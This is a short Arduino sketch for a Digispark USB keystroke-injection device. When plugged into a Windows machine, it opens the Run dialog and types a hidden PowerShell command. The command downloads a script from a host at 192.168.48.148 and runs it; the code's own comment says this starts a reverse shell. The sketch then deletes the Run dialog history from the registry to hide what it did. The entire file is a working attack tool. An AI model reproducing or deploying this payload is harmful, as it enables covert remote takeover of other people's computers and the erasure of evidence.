#include "DigiKeyboard.h"

void setup() {
  // put your code here, to run once:

  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);

  // download + start reverse shell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -windowstyle hidden -nop \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.48.148/ps.txt');\"");
  DigiKeyboard.delay(1000);

  // clean up the run dialog history
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // run dialog
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU' -Name '*' -ErrorAction SilentlyContinue\""); 
}

void loop() {
  // put your code here, to run repeatedly:
}
